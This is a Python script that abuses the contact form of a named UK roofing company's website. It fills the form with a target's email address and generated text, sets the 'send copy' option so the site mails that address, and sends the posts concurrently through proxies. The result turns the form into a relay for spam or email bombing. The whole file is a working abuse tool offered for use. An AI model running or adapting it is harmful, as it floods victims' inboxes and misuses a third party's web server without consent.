from os.path import basename

import requests

from module import Spam

cookies = {
    '77f4e08d58d6b3088c923ad58bb55c44': 'c121b8d3ea9492ef04087499974dfdd2',
}

headers = {
    'authority': 'www.paulnunnroofing.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryqd0SEnxQFOeCR6f2',
    # 'cookie': '77f4e08d58d6b3088c923ad58bb55c44=c121b8d3ea9492ef04087499974dfdd2',
    'origin': 'https://www.paulnunnroofing.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://www.paulnunnroofing.co.uk/index.php/contact',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

params = {
    'chronoform': 'ContactFormNew',
    'event': 'submit',
}

s = 'Your request has been submitted '


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryqd0SEnxQFOeCR6f2\r\nContent-Disposition: form-data; name="Name"\r\n\r\ntest\r\n------WebKitFormBoundaryqd0SEnxQFOeCR6f2\r\nContent-Disposition: form-data; name="Email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryqd0SEnxQFOeCR6f2\r\nContent-Disposition: form-data; name="Subject"\r\n\r\ntest\r\n------WebKitFormBoundaryqd0SEnxQFOeCR6f2\r\nContent-Disposition: form-data; name="Message"\r\n\r\ntest\r\n------WebKitFormBoundaryqd0SEnxQFOeCR6f2\r\nContent-Disposition: form-data; name="SendCopy"\r\n\r\n1\r\n------WebKitFormBoundaryqd0SEnxQFOeCR6f2\r\nContent-Disposition: form-data; name="Validation"\r\n\r\naa\r\n------WebKitFormBoundaryqd0SEnxQFOeCR6f2\r\nContent-Disposition: form-data; name="Submit"\r\n\r\nSubmit\r\n------WebKitFormBoundaryqd0SEnxQFOeCR6f2--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text())

        response = requests.post(
            'https://www.paulnunnroofing.co.uk/index.php/contact',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data.encode(), proxies=self.get_proxies()
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
